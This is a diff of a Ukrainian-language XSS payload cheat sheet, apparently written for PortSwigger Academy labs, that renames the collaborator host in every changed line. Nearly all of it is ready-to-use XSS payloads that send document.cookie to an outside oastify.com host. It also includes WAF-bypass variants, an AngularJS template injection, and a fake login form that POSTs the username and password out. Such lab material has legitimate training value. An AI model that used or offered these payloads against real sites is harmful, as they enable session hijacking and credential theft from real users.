@@ -12,7 +12,7 @@
 ``` 
 >тут в base64 передається 
 ```
-fetch("https://burp.oastify.com/?cookie="+btoa(document['cookie']))
+fetch("https://collaborator.oastify.com/?cookie="+btoa(document['cookie']))
 ```
 **+eval URL encode**
 >тут готова ін'єкція яка повертає відповідно на колаборатор кукі, просто передати script у exploit server
@@ -24,36 +24,36 @@ location="https://YOUR-LAB-ID.web-security-academy.net/?SearchTerm=%22%2Beval(at
 **Function`X$**
 >-Function`X$ тут у нас ін'єкція із використанням динамічних шаблонів, вміст всередині ${...} виконується під час виконання шаблону.
 ```
-"-Function`X${'document.location="https://burp.oastify.com/"+document.cookie'}```-"
+"-Function`X${'document.location="https://collaborator.oastify.com/"+document.cookie'}```-"
 ```
 >адаптована версія із використанням Function`X$, лише передати script у exploit server для отримання cookies
 ```
 <script>
-location="https://YOUR-LAB-ID.web-security-academy.net/?find=%22-Function`X${'document.location=%22https://burp.oastify.com/%22%2Bdocument.cookie'}```-%22"
+location="https://YOUR-LAB-ID.web-security-academy.net/?find=%22-Function`X${'document.location=%22https://collaborator.oastify.com/%22%2Bdocument.cookie'}```-%22"
 </script>
 ```
 **XSS+cookie**
 ```
-<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
+<script>document.location='//collaborator.oastify.com/'+document.cookie</script>
 ```
 ```
-"></select><script>document.location='http://burp.oastify.com/?cookie='+document.cookie</script>
+"></select><script>document.location='http://collaborator.oastify.com/?cookie='+document.cookie</script>
 ```
 ```
-\"-fetch('http://burp.oastify.com?c='+btoa(document.cookie))}//
+\"-fetch('http://collaborator.oastify.com?c='+btoa(document.cookie))}//
 ```
 ```
-<><img src=1 onerror="window.location='http://burp.oastify.com/c='+document.cookie">
+<><img src=1 onerror="window.location='http://collaborator.oastify.com/c='+document.cookie">
 ```
 ```
-<script>document.write('<img+src="http://burp.oastify.com?c='+document.cookie+'"+/>');</script>
+<script>document.write('<img+src="http://collaborator.oastify.com?c='+document.cookie+'"+/>');</script>
 ```
 ```
-</script><script>document.location="http://burp.oastify.com/?cookie="+document.cookie</script>
+</script><script>document.location="http://collaborator.oastify.com/?cookie="+document.cookie</script>
 ```
 ```
 <script>
-location = 'https://YOUR-LAB-ID.web-security-academy.net/?query=<body onload=document.location='https://burp.oastify.com/?cookie='+document.cookie tabindex=1>#x';
+location = 'https://YOUR-LAB-ID.web-security-academy.net/?query=<body onload=document.location='https://collaborator.oastify.com/?cookie='+document.cookie tabindex=1>#x';
 </script>
 ```
 >готова ін'єкція для query параметру, якщо такий вразливий
@@ -63,23 +63,23 @@ location = 'https://YOUR-LAB-ID.web-security-academy.net/?query=%3Cbody+onload%3
 </script>
 ```
 ```
-\';document.location=`http://burp.oastify.com/?cookie=`+document.cookie;//
+\';document.location=`http://collaborator.oastify.com/?cookie=`+document.cookie;//
 ```
 >викликаємо XSS через id=x, якщо задати в посиланні #x
 ```
-<xss id=x onfocus=document.location="http://burp.oastify.com/?cookie="+document.cookie tabindex=1>#x
+<xss id=x onfocus=document.location="http://collaborator.oastify.com/?cookie="+document.cookie tabindex=1>#x
 ```
 >ULR Encoded:
 ```
-%3Cxss%20id=x%20onfocus=document.location=%22http://burp.oastify.com/?cookie=%22+document.cookie%20tabindex=1%3E#x
+%3Cxss%20id=x%20onfocus=document.location=%22http://collaborator.oastify.com/?cookie=%22+document.cookie%20tabindex=1%3E#x
 ```
 >підбір tag та event (є така лабораторна робота у portswigger)
 ```
-<svg><animatetransform onbegin=document.location='https://burp.oastify.com/?cookie='+document.cookie;>
+<svg><animatetransform onbegin=document.location='https://collaborator.oastify.com/?cookie='+document.cookie;>
 ```
 >URL Encoded:
 ```
-%3Csvg%3E%3Canimatetransform%20onbegin=document.location='https://burp.oastify.com/?cookie='+document.cookie;%3E
+%3Csvg%3E%3Canimatetransform%20onbegin=document.location='https://collaborator.oastify.com/?cookie='+document.cookie;%3E
 ```
 >викликаємо XSS через натискання жертвою кнопки x. Повний вигляд такий (для гарячої клавіші shift+X):
 ```
@@ -88,7 +88,7 @@ https://xxxxxx.net/?'accesskey='x'onclick='document.location="https://your-colla
 ***WAF***
 >трохи спробуємо обійти WAF
 ```
-</ScRiPt ><ScRiPt >document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />');</ScRiPt > 
+</ScRiPt ><ScRiPt >document.write('<img src="http://collaborator.oastify.com?c='+document.cookie+'" />');</ScRiPt > 
 ```
 >і передати його у ASCII (можна використовувати цей [сервіс](https://www.allmath.com/ascii-to-text.php), досить зручний)
 ```
@@ -107,13 +107,13 @@ https://xxxxxx.net/?'accesskey='x'onclick='document.location="https://your-colla
 >тут у нас ін'єкція яка застосовується на сторінці із використанням AngularJS. 
 constructor.constructor в Angular дає доступ до глобальної функції Function, яка дозволяє створювати і виконувати JavaScript-код у шаблоні. 
 ```
-{{constructor.constructor('document.location="http://burp.oastify.com?c="+document.cookie')()}}
+{{constructor.constructor('document.location="http://collaborator.oastify.com?c="+document.cookie')()}}
 ```
 **XSS+input+cookie**
 >ін'єкція для викрадення паролю і логіна користувача, який скористається формою для авторизації. Звісно, сторінка повинна мати вразливість до XSS.
 ```
 <input name=username id=username>
-<input type=password name=password onchange="if(this.value.length)fetch('http://burp.oastify.com',{
+<input type=password name=password onchange="if(this.value.length)fetch('http://collaborator.oastify.com',{
 method:'POST',
 mode: 'no-cors',
 body:username.value+':'+this.value
